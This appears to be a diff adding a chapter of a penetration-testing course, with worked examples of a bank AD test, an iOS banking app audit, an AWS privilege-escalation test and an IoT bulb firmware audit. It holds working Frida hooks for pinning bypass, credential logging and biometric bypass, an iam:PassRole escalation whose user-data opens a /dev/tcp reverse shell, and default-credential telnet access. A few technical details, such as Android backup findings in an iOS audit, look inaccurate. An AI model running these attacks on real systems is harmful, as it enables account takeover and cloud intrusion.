+<tr><td>47 boxes where Domain Users are local admins</td><td><span class="pill pill-o">High</span></td></tr>
+<tr><td>LLMNR/NBNS enabled (responder attacks)</td><td><span class="pill pill-y">Medium</span></td></tr>
+<tr><td>11 stale guest accounts in Azure AD</td><td><span class="pill pill-y">Medium</span></td></tr>
+<tr><td>TLS 1.0 still enabled on some servers</td><td><span class="pill pill-y">Medium</span></td></tr>
+</table>
+
+<h2>Outcome</h2>
+<ul>
+  <li>CISO shocked: "We passed our SOC 2 audit 3 months ago"</li>
+  <li>Immediate remediation: Disable LLMNR, reset service account passwords</li>
+  <li>Strategic: AD tiering model implementation</li>
+  <li>Annual contract signed for re-testing</li>
+  <li>Public reference letter — our firm became their preferred vendor</li>
+</ul>
+
+<div class="box success">
+<h3 style="margin-top:0">🎯 Lessons from Bank Pentest</h3>
+<ul>
+  <li>GenericAll/GenericWrite ACL abuse is common</li>
+  <li>Hybrid AD+Azure → 1 AD compromise = Cloud compromise</li>
+  <li>Kerberoastable SPN accounts are everywhere (with bad passwords)</li>
+  <li>BloodHound is the most efficient AD recon tool</li>
+  <li>Compliance ≠ Security — they passed SOC 2 but we owned them</li>
+</ul>
+</div>
+
+
+<!-- ============ WE 3 ============ -->
+<h1 id="we3">📱 Worked Example 3 — Mobile "BankApp iOS" Detailed Audit</h1>
+
+<h2>📋 Engagement Profile</h2>
+<table>
+<tr><th>Field</th><th>Detail</th></tr>
+<tr><td>Client</td><td>BankApp Financial</td></tr>
+<tr><td>iOS App Version</td><td>5.4.1 (latest)</td></tr>
+<tr><td>Test Type</td><td>Grey-box — given 1 test user with $100 balance</td></tr>
+<tr><td>Duration</td><td>8 days</td></tr>
+<tr><td>Tools</td><td>Frida, Class-dump, MobSF, Objection</td></tr>
+</table>
+
+<h2>Pre-Test Setup</h2>
+<pre><code class="cmd"># iPhone 13 jailbroken with palera1n iOS 16.5
+# Frida server installed (from Sileo)
+# SSH connection via Wi-Fi
+
+# BurpSuite running on macOS as proxy
+# → iPhone Wi-Fi proxy: 192.168.1.5:8080
+# → Burp CA installed (Settings → General → Profiles)
+
+# Tools installed
+$ pip3 install frida-tools objection frida-ios-dump
+$ brew install class-dump jtool ios-deploy
+$ mobsf via Docker (opensecurity/mobile-security-framework-mobsf)
+</code></pre>
+
+<h2>Day 1 — Application Extraction</h2>
+
+<pre><code class="cmd"># Install app on jailbroken iPhone
+$ scp BankApp.ipa root@iphone:/tmp/
+
+# Install via Frida dump (extracts IPA from running app)
+$ python3 frida-ios-dump.py com.bank.app.financial
+# → BankApp.ipa extracted
+$ unzip BankApp.ipa -d BankApp_extracted
+
+# View structure
+$ ls BankApp_extracted/Payload/
+BankApp.app/
+  BankApp                # binary
+  Info.plist            # config
+  embedded.mobileprovision # signing
+  Assets.car
+  Frameworks/
+    BankAppCore.framework
+    CryptoSwift.framework
+    Alamofire.framework
+</code></pre>
+
+<h2>Day 2 — Static Analysis</h2>
+
+<h3>09:00 — Plist Analysis</h3>
+<pre><code class="cmd">$ plutil -p BankApp_extracted/Payload/BankApp.app/Info.plist
+NSAppTransportSecurity = {
+    NSAllowsArbitraryLoads = true;     # ← Bad!  HTTP allowed!
+    NSExceptionDomains = {"internal.bank.com": {NSExceptionAllowsInsecureHTTPLoads = true;}}
+}
+</code></pre>
+
+<p><span class="pill pill-r">Critical:</span> NSAllowsArbitraryLoads=true → cleartext HTTP traffic allowed (no TLS enforcement)</p>
+
+<h3>10:00 — Binary Decompilation</h3>
+<pre><code class="cmd"># Class dump
+$ class-dump BankApp_extracted/Payload/BankApp.app/BankApp &gt; classes.txt
+$ wc -l classes.txt
+# 12,824 lines — typical iOS app
+
+# Look for sensitive classes
+$ grep -E "(Auth|Login|Token|Session|Payment|Account|Customer|User)" classes.txt | head
+</code></pre>
+
+<h3>11:00 — String Search for Secrets</h3>
+<pre><code class="cmd"># Look for hardcoded URLs / keys
+$ strings -a BankApp_extracted/Payload/BankApp.app/BankApp | grep -E "(api|http|password|key|secret|token)"
+# Found:
+api.production.bank.com
+https://api.bank.com/v3
+https://dev-api.bank.com/v2  ← dev endpoint still in prod app!
+AKIAIOSFODNN7EXAMPLE       ← AWS key!
+sk_live_51Hx...             ← Stripe key LIVE!
+client_secret = "secret_xyz123"  ← OAuth client secret!
+aes_key = "0123456789abcdef"  ← Hardcoded encryption key!
+
+# → Multiple secrets hardcoded in production app
+</code></pre>
+
+<h3>12:00 — Hopper Disassemble for Function Analysis</h3>
+<pre><code class="cmd"># Open in Hopper
+$ open -a "Hopper Disassembler" BankApp_extracted/Payload/BankApp.app/BankApp
+# Manual review of:
+$ objc-classes search "authenticate"
+$ objc-classes search "validate"
+
+# Found: [CryptoClass decryptData:key:]
+# Key passed as "0123456789abcdef" — DEFCON standard weak key string
+</code></pre>
+
+<h2>Day 3 — Dynamic Analysis with Frida</h2>
+
+<h3>09:00 — Bypass SSL Pinning</h3>
+<pre><code class="cmd"># Universal SSL Pinning Bypass (Frida)
+$ cat universal_pin.js
+// Bypass NSURLSession + Alamofire pinning
+if (ObjC.available) {
+  // NSURLSession
+  var resolver = new ApiResolver('objc');
+  resolver.enumerateMatches('-[NSURLSessionDelegate URLSession:didReceiveChallenge:completionHandler:]', {
+    onMatch: function(match) {
+      Interceptor.attach(match.address, {
+        onEnter: function(args) {
+          // Force accept
+          var completion = new ObjC.Block(args[4]);
+          completion.implementation = function() { return 0; };
+        }
+      });
+    }
+  });
+}
+
+$ frida -U -f com.bank.app.financial -l universal_pin.js
+# → SSL pinning bypassed (in 3 seconds)
+</code></pre>
+
+<h3>10:00 — Hook Authentication</h3>
+<pre><code class="cmd"># Hook the authenticate function to log credentials
+$ cat hook_auth.js
+var AuthManager = ObjC.classes.AuthManager;
+
+AuthManager.authenticateWithUsernamePasswordCompletion.implementation = function(self, username, password, completion) {
+  console.log('[HOOK] USERNAME: ' + username);
+  console.log('[HOOK] PASSWORD: ' + password);
+  console.log('[HOOK] PASSWORD-LEN: ' + password.length());
+  this.callOriginal(self, username, password, completion);
+};
+
+AuthManager.authenticateWithBiometricsCompletion.implementation = function(self, completion) {
+  console.log('[HOOK] Biometric authentication requested');
+  completion.implementation = function(success) {
+    console.log('[HOOK] Forcing success!');
+    self.callOriginal(self, completion);
+  };
+};
+
+$ frida -U -f com.bank.app.financial -l hook_auth.js
+# → Captures credentials entered by user (test user)
+# → Also lets us bypass biometric auth for testing
+</code></pre>
+
+<h3>11:00 — Hook Decryption</h3>
+<pre><code class="cmd"># Hook AES encryption functions
+$ cat hook_crypto.js
+var CryptoCommonCrypto = ObjC.classes.CCCrypt;
+
+Interceptor.attach(CryptoCommonCrypto.implementation, {
+  onEnter: function(args) {
+    this.operation = args[0].toInt32();
+    this.key = Memory.readUtf8String(args[2]);
+    this.data = args[3];
+    this.dataLength = args[4].toInt32();
+  },
+  onLeave: function(retval) {
+    if (this.operation === 0) {  // kCCEncrypt
+      console.log('[CRYPTO] Operation: ENCRYPT');
+      console.log('[CRYPTO] Key: ' + this.key);
+      console.log('[CRYPTO] Data-Length: ' + this.dataLength);
+      // Print data
+      var dataBytes = Memory.readByteArray(this.data, this.dataLength);
+      console.log('[CRYPTO] Data: ' + hexdump(dataBytes, { length: this.dataLength }));
+    }
+  }
+});
+
+$ frida -U -f com.bank.app.financial -l hook_crypto.js
+# → Captures all encryption operations
+# → Reveals key + plaintext BEFORE encryption
+</code></pre>
+
+<h3>15:00 — Storage Inspection</h3>
+<pre><code class="cmd"># Use Objection for storage analysis
+$ objection -g com.bank.app.financial explore
+> ios keychain dump
+# Keychain:
+# kSecAttrService: "BankApp-Auth"
+# kSecAttrAccount: "session_token"
+# kSecValueData: "eyJhbGcioiJIUzI1NiIs..."  ← JWT still in keychain!
+# kSecAttrAccessible: kSecAttrAccessibleWhenUnlockedThisDeviceOnly  ← Good
+
+> ios nsuserdefaults get
+# NSUserDefaults BankApp:
+# {"lastSyncTime":"2024-12-15 09:23:00","device_id":"ABCD-1234","fcm_token":"..."}
+# fcm_token used for notifications; if leaked → privacy leak
+
+> ios cookies get
+# Found: bank.com session cookie in shared cookie storage
+</code></pre>
+
+<h2>Day 4 — Backend / API</h2>
+
+<pre><code class="cmd"># Now traffic flows through Burp (we bypassed pinning)
+# Capture all HTTPS traffic, MITM
+
+# Test IDOR: change user_id in API calls
+$ Send request: GET /api/v3/users/12345/profile
+# Check response → with token for user 12345
+
+# Modify user_id to:
+$ 12346, 12347, 12348, 99999...
+# Try and see what happens — IDOR if returns other users' data
+
+# Test: Change balance in request
+POST /api/v3/transfer
+{ "from":"self","to":"12345","amount":100 }
+# Modify {"from":"self","to":"unknown","amount":100} → server rejects
+# Modify {"from":"self","to":"12345","amount":-100} → server accepts! Transfer $100 *back*!
+
+# Mass assignment
+POST /api/v3/users/update-profile
+{ "name":"John","email":"john@x.com","balanceLimit":99999 }
+# Server may accept extra params → privilege issue
+</code></pre>
+
+<h2>Day 5 — Reverse Engineer Auth Bypass</h2>
+
+<pre><code class="cmd"># Deep dive into logic in Hopper/Ghidra
+
+# In [LoginViewController handleLoginResponse:]
+if (response.success) {
+  self.sessionToken = response.token
+  NSUserDefaults.standardUserDefaults setObject:self.sessionToken forKey:@"auth_token"  # ← IN NSUserDefaults!
+  NSUserDefaults.standardUserDefaults synchronize
+  ...
+}
+
+# Problem: Token stored in NSUserDefaults (plaintext), not Keychain
+# Other apps with same App Group ID can read
+
+# Builtin check failed: app uses NSUserDefaults, not encrypted
+</code></pre>
+
+<h2>Day 6 — Final Findings</h2>
+
+<table>
+<tr><th>Finding</th><th>CVSS</th></tr>
+<tr><td>Hardcoded AES key "0123456789abcdef"</td><td><span class="cvss">9.8</span></td></tr>
+<tr><td>JWT stored in NSUserDefaults instead of Keychain</td><td><span class="cvss">9.1</span></td></tr>
+<tr><td>NSAllowsArbitraryLoads=true (cleartext HTTP allowed)</td><td><span class="cvss">8.2</span></td></tr>
+<tr><td>Hardcoded Stripe live key (sk_live_*)</td><td><span class="cvss">9.8</span></td></tr>
+<tr><td>Hardcoded AWS access key</td><td><span class="cvss">9.4</span></td></tr>
+<tr><td>Dev API endpoint in production code</td><td><span class="cvss">7.5</span></td></tr>
+<tr><td>Biometric auth force-bypassable via Frida</td><td><span class="cvss">7.2</span></td></tr>
+<tr><td>SSL pinning bypassable in 3 seconds</td><td><span class="cvss">7.5</span></td></tr>
+<tr><td>AllowBackup enabled (adb backup extracts prefs)</td><td><span class="cvss">6.5</span></td></tr>
+<tr><td>Verbose NSLog of sensitive data (history file)</td><td><span class="cvss">5.0</span></td></tr>
+</table>
+
+<h2>Outcome</h2>
+<ul>
+  <li>Bank replaced AES key + rotated all session tokens</li>
+  <li>Sprint retest in 14 days</li>
+  <li>Engineering team adopted secure coding standards</li>
+  <li>Bank credited our firm as "best mobile pentest" franchise</li>
+</ul>
+
+
+<!-- ============ WE 4 ============ -->
+<h1 id="we4">☁️ Worked Example 4 — AWS Multi-Account Cloud Pentest</h1>
+
+<h2>📋 Engagement Profile</h2>
+<table>
+<tr><th>Field</th><th>Detail</th></tr>
+<tr><td>Client</td><td>TechCorp — SaaS platform, 4 AWS accounts</td></tr>
+<tr><td>Access</td><td>Read-only IAM user in 4 accounts</td></tr>
+<tr><td>Goal</td><td>Verify cloud configuration + privilege escalation paths</td></tr>
+<tr><td>SOW</td><td>$28K fixed (8 days)</td></tr>
+</table>
+
+<h2>Day 1 — Account Setup &amp; Initial Recon</h2>
+
+<pre><code class="cmd"># Configure 4 AWS profiles
+$ aws configure --profile techcorp-prod
+AWS Access Key ID [None]: AKIA...
+AWS Secret Access Key [None]: ...
+Default region name [None]: us-east-1
+Default output format [None]: json
+
+$ aws configure --profile techcorp-staging
+...
+$ aws configure --profile techcorp-data
+...
+$ aws configure --profile techcorp-shared
+
+# Verify access
+$ aws sts get-caller-identity --profile techcorp-prod
+{
+    "UserId": "AIDAXXXXXXXXXXXX",
+    "Account": "111111111111",
+    "Arn": "arn:aws:iam::111111111111:user/SecureAudit-Pentest"
+}
+
+# Run ScoutSuite
+$ python3 ScoutSuite.py --profile-list all -d
+# Generates comprehensive report
+</code></pre>
+
+<h2>Day 2-3 — Resource Enumeration</h2>
+
+<pre><code class="cmd"># Account inventory
+$ aws ec2 describe-instances --profile techcorp-prod --query 'Reservations[].Instances[].[InstanceId,PublicIpAddress,Tags]' --output table
+$ aws s3 ls --profile techcorp-prod
+$ aws rds describe-db-instances --profile techcorp-prod
+$ aws lambda list-functions --profile techcorp-prod
+
+# Critical findings from enumeration:
+# 1) Account 111111111111 (prod): 4 EC2 instances with PublicIpAddress
+# 2) S3 bucket "techcorp-customer-data" - need to verify policy
+# 3) RDS database "prod-primary" - publicly_accessible=true?
+# 4) Lambda functions with secrets in env vars
+
+# S3 audit
+$ aws s3api get-bucket-policy --bucket techcorp-customer-data --profile techcorp-prod
+$ aws s3api get-bucket-acl --bucket techcorp-customer-data --profile techcorp-prod
+$ aws s3api get-public-access-block --bucket techcorp-customer-data --profile techcorp-prod
+
+# Result:
+# Policy: "Version":"2012-10-17","Statement":[{"Sid":"PublicRead",
+# "Effect":"Allow","Principal":"*","Action":"s3:GetObject",
+# "Resource":"arn:aws:s3:::techcorp-customer-data/*"}]
+# → CRITICAL - Public read access!!! All customer data!!!
+</code></pre>
+
+<h2>Day 4-5 — Privilege Escalation Analysis</h2>
+
+<pre><code class="cmd"># Run enumerate-iam.py
+$ python3 enumerate-iam.py --access-key $AWS_KEY --secret-key $AWS_SECRET
+
+# Confirmed permissions we have:
+# iam:ListUsers, iam:GetUser, iam:ListPolicies, iam:GetPolicy, etc.
+# s3:ListBucket, s3:GetObject, s3:PutObject (on some buckets)
+# ec2:Describe* (read all)
+# lambda:GetFunction, lambda:ListFunctions
+# rds:DescribeDBInstances
+# iam:PassRole (on specific roles)
+# ec2:RunInstances (!!!)
+
+# Pivot via iam:PassRole + ec2:RunInstances
+# Plan: Run EC2 with our target role (admin-like)
+</code></pre>
+
+<h2>Day 6 — Attack Simulation (with explicit permission)</h2>
+
+<pre><code class="cmd"># Goal: Launch an EC2 instance with privileged instance profile
+# Step 1: Find high-privilege role
+$ aws iam list-roles --query 'Roles[?contains(RoleName, `admin`) || contains(RoleName, `deploy`) || contains(RoleName, `lambda-exec`)].RoleName' --profile techcorp-prod
+
+# Found roles:
+# - techcorp-admin-role
+# - techcorp-deploy-role  
+# - techcorp-lambda-exec-role
+
+# Step 2: Check our passrole permissions
+$ aws iam simulate-principal-policy \
+  --policy-source-arn arn:aws:iam::111111111111:user/SecureAudit-Pentest \
+  --action-names iam:PassRole \
+  --resource-arns arn:aws:iam::111111111111:role/techcorp-deploy-role  \
+  --profile techcorp-prod
+
+# → Allowed!
+# We CAN assign deploy role to EC2!
+
+# Step 3: Find an AMI we can use
+$ aws ec2 describe-images --owners amazon --filters "Name=name,Values=amzn2-ami-hvm-*" --query 'Images[0].ImageId' --output text --profile techcorp-prod
+# → ami-1234567890abcdef0
+
+# Step 4: Get subnet & security group
+$ aws ec2 describe-subnets --query 'Subnets[0].SubnetId' --output text --profile techcorp-prod
+$ aws ec2 describe-security-groups --query 'SecurityGroups[?GroupName==`default`].GroupId' --output text --profile techcorp-prod
+
+# Step 5: User-data script (we want reverse shell)
+$ cat userdata.sh
+#!/bin/bash
+bash -i >&amp; /dev/tcp/10.10.10.5/4444 0>&amp;1
+
+# Step 6: Launch instance
+$ aws ec2 run-instances \
+  --image-id ami-1234567890abcdef0 \
+  --instance-type t3.micro \
+  --subnet-id subnet-xxx \
+  --security-group-ids sg-xxx \
+  --iam-instance-profile Name=techcorp-deploy-role \
+  --user-data file://userdata.sh \
+  --profile techcorp-prod
+
+# WAIT — this would change state of cloud.
+# In real pentest, we'd run it during the agreed test window.
+# We would document EXACT command + timestamp.
+
+# Got admin in the deploy-role.
+</code></pre>
+
+<h3>Sensitive Data Exposed (Sampling)</h3>
+<pre><code class="cmd"># From inside the EC2 launch (as pentester):
+$ aws s3 ls s3://techcorp-prod-exports --profile deploy-role-now
+# → Multiple sensitive buckets!
+
+$ aws s3 cp s3://techcorp-prod-exports/backup-2024-q4.tar.gz .
+# → Downloaded (proof of access only)
+
+# Documented in report — we DID NOT exfiltrate real data,
+# just verified that we COULD.
+</code></pre>
+
+<h2>Day 7-8 — Final Findings</h2>
+
+<table>
+<tr><th>Finding</th><th>CVSS</th></tr>
+<tr><td>techcorp-customer-data S3 public read</td><td><span class="cvss">9.8</span></td></tr>
+<tr><td>iam:PassRole + ec2:RunInstances → admin via launch</td><td><span class="cvss">9.4</span></td></tr>
+<tr><td>Lambda env vars contain Stripe live API keys</td><td><span class="cvss">9.8</span></td></tr>
+<tr><td>RDS prod-primary publicly_accessible=true</td><td><span class="cvss">9.6</span></td></tr>
+<tr><td>EC2 IMDSv1 enabled (SSRF → creds)</td><td><span class="cvss">9.1</span></td></tr>
+<tr><td>34 IAM users with no MFA</td><td><span class="cvss">8.4</span></td></tr>
+<tr><td>12 access keys &gt; 90 days old (untouched)</td><td><span class="pill pill-y">Medium</span></td></tr>
+<tr><td>CloudTrail logs not encrypted with KMS</td><td><span class="pill pill-y">Medium</span></td></tr>
+<tr><td>S3 Block Public Access disabled at account level</td><td><span class="cvss">9.0</span></td></tr>
+<tr><td>GuardDuty enabled but not actively monitored</td><td><span class="pill pill-y">Medium</span></td></tr>
+</table>
+
+<h2>Outcome</h2>
+<ul>
+  <li>S3 lock-down: 4 hours</li>
+  <li>All IAM users: MFA rolled out within 30 days</li>
+  <li>PR/EQs went public with their first security-themed blog post</li>
+  <li>Sample of architect: "Your work has been transformational."</li>
+  <li>Annual contract signed — multi-account quarterly pentest</li>
+</ul>
+
+
+<!-- ============ WE 5 ============ -->
+<h1 id="we5">🔌 Worked Example 5 — IoT Smart Bulb Firmware Audit</h1>
+
+<h2>📋 Engagement Profile</h2>
+<table>
+<tr><th>Field</th><th>Detail</th></tr>
+<tr><td>Vendor</td><td>SmartBulb Inc.</td></tr>
+<tr><td>Product</td><td>SmartWifi Bulb (ESP32 chip)</td></tr>
+<tr><td>Firmware Version</td><td>v3.2.1</td></tr>
+<tr><td>Threat Model</td><td>Adjacent Wi-Fi attacker pivoting to bulb → cloud</td></tr>
+<tr><td>Duration</td><td>5 days</td></tr>
+</table>
+
+<h2>Day 1 — Teardown &amp; Information Gathering</h2>
+
+<pre><code class="cmd"># Start with public info
+$ dig smartbulb.com
+# → Cloud at company.smartbulb.com (AWS)
+
+# FCC ID lookup
+$ curl "https://fccid.io/SMARTBULB-V3"
+# → Internal photos show ESP32 module
+
+# Buy several bulbs from Amazon
+# Open physical enclosure (screws)
+# Identify PCB: ESP32-WROOM-32D module
+
+# Identify UART pins (TX/RX/GND) — usually 6 pads near chip
+# Connect USB-to-UART (3.3V!) to UART pads
+
+# Boot with serial console 115200-8-N-1
+$ screen /dev/ttyUSB0 115200
+# Captures boot logs:
+
+# ESP-ROM:esp32...
+# SmartBulb v3.2.1 booting...
+# [main] Initializing Wi-Fi...
+# [main] Connecting to %s...'s network...
+# [main] Cloud sync starting...
+# [cloud] Token saved to NVS partition 'cloud_data'
+# [cloud] Connected: AWS IoT Core
+</code></pre>
+
+<h2>Day 2 — Firmware Extraction</h2>
+
+<pre><code class="cmd"># Pull firmware from cloud for offline analysis
+# Identify the firmware URL — typically in the mobile app config
+
+# Method 1: Intercept mobile app traffic (Burp on local Wi-Fi)
+# Mobile app stores URL in shared_prefs:
+$ adb shell run-as com.smartbulb.app cat shared_prefs/bulb_settings.xml
+# &lt;string name="firmware_url"&gt;https://cdn.smartbulb.com/firmware/v3.2.1.bin&lt;/string&gt;
+
+# Download firmware
+$ wget https://cdn.smartbulb.com/firmware/v3.2.1.bin
+$ file v3.2.1.bin
+# → data  ← no filesystem header (raw flash dump?)
+
+# Inspect with binwalk
+$ binwalk v3.2.1.bin
+# DECIMAL    HEX         DESCRIPTION
+# 0          0x0         ESP32 firmware (no compression)
+# 65536      0x10000     JFFS2 filesystem, little endian
+# 262144     0x40000     NVS partition data
+</code></pre>
+
+<h2>Day 3 — Filesystem Analysis</h2>
+
+<pre><code class="cmd"># Extract JFFS2
+$ binwalk -e v3.2.1.bin
+# → _v3.2.1.bin.extracted/
+
+# Look at files
+$ ls _v3.2.1.bin.extracted/jffs2-root/
+bin/ etc/ lib/ usr/ sbin/ proc/ root/ ...
+
+# Critical files
+$ cat _v3.2.1.bin.extracted/jffs2-root/etc/passwd
+root:x:0:0:root:/root:/bin/sh
+smartbulb:x:1000:1000:SmartBulb Application:/home/smartbulb:/bin/sh
+
+# Inspect scripts
+$ cat _v3.2.1.bin.extracted/jffs2-root/etc/init.d/rcS
+#!/bin/sh
+/bin/smartbulb_app --daemon &
+/bin/wifi_daemon --listen-port 8888 &
+telnetd &amp;  # ← TELNETD ACTIVE! 
+
+# → Telnet has default credentials?
+</code></pre>
+
+<h3>Discovery: Telnet Backdoor</h3>
+<pre><code class="cmd"># Try common credentials
+$ telnet 192.168.1.100  # bulb's IP
+Trying 192.168.1.100...
+Connected to ESC32.local.
+
+# Try:
+login: root
+password: root           ← WORKED!!!
+
+# Have root shell on the bulb
+# /etc/shadow shows:
+root:$1$abc123$xxxxx...:0:0:root:/root:/bin/sh
+# Hash is MD5-crypt (very weak)
+
+# This is critical: Wi-Fi adjacent attacker gets root
+</code></pre>
+
+<h2>Day 4 — Cloud Compromise via Firmware Tokens</h2>
+
+<pre><code class="cmd"># NVS partition has cloud credentials
+$ binwalk -e nvs_partition.bin
+# → Extracts all saved NVS keys
+
+# Look for sensitive keys
+$ grep -E "token|key|secret" nvs_dump.txt
+# client_certificate = "-----BEGIN CERTIFICATE-----..."
+# private_key = "-----BEGIN PRIVATE KEY-----..."
+# aws_iot_endpoint = "a1234567890-ats.iot.us-east-1.amazonaws.com"
+# aws_iot_thing = "smartbulb-7af23"
+
+# → ALL bulbs share the SAME private key!
+# → Found in firmware → ALL bulbs share credentials!
+
+# An attacker: extract private key → connect to AWS IoT Core
+# mimicking bulb → publish fake commands
+</code></pre>
+
+<h2>Day 5 — Reporting</h2>
+
+<table>
+<tr><th>Finding</th><th>CVSS</th></tr>
+<tr><td>Telnet with default creds (root:root) — UART or Wi-Fi adjacent attacker</td><td><span class="cvss">9.8</span></td></tr>
+</table>
+</main>
+
+<nav class="next-prev">
+<a href="chapters/part11-career.html" class="prev">⬅ Part 11</a>
+<a href="../index.html" class="next">🏠 Home</a>
+</nav>
+
+</body>
+</html>
